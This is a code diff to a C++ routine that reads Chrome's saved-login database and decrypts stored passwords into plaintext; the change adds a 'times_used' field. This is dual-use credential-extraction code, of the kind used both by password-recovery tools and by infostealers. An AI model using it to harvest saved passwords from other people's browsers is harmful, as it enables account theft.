@@ -71,7 +71,7 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
 
     unique_sqlite3_stmt stmt;
     if (sqlite3_prepare_v2(db.get(),
-                           "SELECT origin_url, date_created, date_last_used, date_password_modified, username_value, password_value FROM logins",
+                           "SELECT origin_url, date_created, date_last_used, date_password_modified, times_used, username_value, password_value FROM logins",
                            -1, &stmt, NULL) != SQLITE_OK) {
         return std::unexpected(browser_error::sqlite_error);
     }
@@ -86,9 +86,10 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         const sqlite3_int64  db_date_created           = sqlite3_column_int64(stmt.get(), 1);
         const sqlite3_int64  db_date_last_used         = sqlite3_column_int64(stmt.get(), 2);
         const sqlite3_int64  db_date_password_modified = sqlite3_column_int64(stmt.get(), 3);
-        const std::string    db_username_value         = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 4));
-        const uint8_t       *db_password_value         = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt.get(), 5));
-        const size_t         db_password_value_size    = sqlite3_column_bytes(stmt.get(), 5);
+        const int            db_times_used             = sqlite3_column_int(stmt.get(), 4);
+        const std::string    db_username_value         = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 5));
+        const uint8_t       *db_password_value         = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt.get(), 6));
+        const size_t         db_password_value_size    = sqlite3_column_bytes(stmt.get(), 6);
         // clang-format on
 
         std::vector<uint8_t> db_password(db_password_value, db_password_value + db_password_value_size);
@@ -117,6 +118,7 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
             .url = db_origin_url,
             .username = db_username_value,
             .password = password_plaintext,
+            .times_used = db_times_used,
             .date_created = date_created,
             .date_last_used = date_last_used,
             .date_password_modified = date_password_modified,
